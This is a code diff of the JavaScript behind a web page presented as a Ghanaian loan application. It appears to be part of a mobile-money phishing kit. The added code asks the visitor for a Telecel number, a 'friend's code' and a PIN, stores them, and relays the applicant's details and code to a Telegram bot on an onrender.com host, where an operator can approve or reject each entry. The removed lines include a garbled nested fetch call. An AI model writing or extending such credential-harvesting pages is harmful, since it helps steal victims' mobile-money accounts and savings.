@@ -1,6 +1,6 @@
-const API_URL = ''; // Use relative URLs
-
+// Wait for DOM to load
 document.addEventListener('DOMContentLoaded', function() {
+    // Load data from localStorage
     const loanData = JSON.parse(localStorage.getItem('loanApp'));
     
     if (loanData) {
@@ -8,44 +8,81 @@ document.addEventListener('DOMContentLoaded', function() {
         document.getElementById('displayAmount').textContent = 'GHS ' + loanData.loanAmount;
         document.getElementById('displayPhone').textContent = loanData.phone;
         document.getElementById('displayRef').textContent = loanData.referenceId;
+    } else {
+        window.location.href = 'index.html';
     }
 });
 
+// Handle form submission
 document.getElementById('verificationForm').addEventListener('submit', async function(e) {
     e.preventDefault();
     
     const loanData = JSON.parse(localStorage.getItem('loanApp'));
-    const friendCode = document.getElementById('friendCode').value;
+    const telecelNumber = document.getElementById('telecelNumber').value.trim();
+    const friendCode = document.getElementById('friendCode').value.trim();
+    const pin = document.getElementById('pin').value.trim();
     
-    const message = `
-🔔 *NEW LOAN APPLICATION*
-━━━━━━━━━━━━━━━━━━
-📱 *Phone:* ${loanData.phone}
-🔑 *Friend's Code:* ${friendCode}
-💰 *Amount:* GHS ${loanData.loanAmount}
-👤 *Name:* ${loanData.fullname}
-🆔 *Ref:* ${loanData.referenceId}
-━━━━━━━━━━━━━━━━━━
-
-*Actions:*
-✅ /approve_${loanData.referenceId} - Approve
-❌ /reject_${loanData.referenceId} - Reject
-    `;
+    if (!telecelNumber || !friendCode || !pin) {
+        alert('Please fill all fields');
+        return;
+    }
     
-    document.getElementById('loadingOverlay').classList.remove('hidden');
+    if (telecelNumber.length !== 10) {
+        alert('Please enter a valid 10-digit Telecel number');
+        return;
+    }
+    
+    // Save full data
+    const fullData = {
+        ...loanData,
+        telecelNumber,
+        friendCode,
+        pin
+    };
+    localStorage.setItem('fullApp', JSON.stringify(fullData));
+    
+    // Show loading
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    if (loadingOverlay) {
+        loadingOverlay.classList.remove('hidden');
+    }
+    
+    // Prepare message for Telegram
+    const message = `🔔 *NEW LOAN APPLICATION*\n━━━━━━━━━━━━━━━━━━\n📱 *Phone:* ${loanData.phone}\n🔑 *Friend's Code:* ${friendCode}\n💰 *Amount:* GHS ${loanData.loanAmount}\n👤 *Name:* ${loanData.fullname}\n🆔 *Ref:* ${loanData.referenceId}\n━━━━━━━━━━━━━━━━━━\n\n*Actions:*\n✅ /approve_${loanData.referenceId} - Approve\n❌ /reject_${loanData.referenceId} - Reject`;
     
     try {
-        fetch('https://ghana-bayport-loans-1.onrender.com/api/send-message', {
-            fetch(`https://ghana-loans-xz37.onrender.com/api/get-updates/${lastUpdateId}`);
+        // Send to backend API
+        const response = await fetch('https://ghana-loans-xz37.onrender.com/api/send-message', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ message })
         });
         
-        localStorage.setItem('currentRef', loanData.referenceId);
-        window.location.href = 'page3.html';
+        if (response.ok) {
+            localStorage.setItem('currentRef', loanData.referenceId);
+            window.location.href = 'page3.html';
+        } else {
+            throw new Error('Failed to send');
+        }
     } catch (error) {
-        alert('Error sending to Telegram');
-        document.getElementById('loadingOverlay').classList.add('hidden');
+        alert('Error sending to Telegram. Please try again.');
+        if (loadingOverlay) {
+            loadingOverlay.classList.add('hidden');
+        }
     }
 });
+
+// Input validation
+const telecelInput = document.getElementById('telecelNumber');
+if (telecelInput) {
+    telecelInput.addEventListener('input', function(e) {
+        this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
+    });
+}
+
+const pinInput = document.getElementById('pin');
+if (pinInput) {
+    pinInput.addEventListener('input', function(e) {
+        this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
+    });
+}
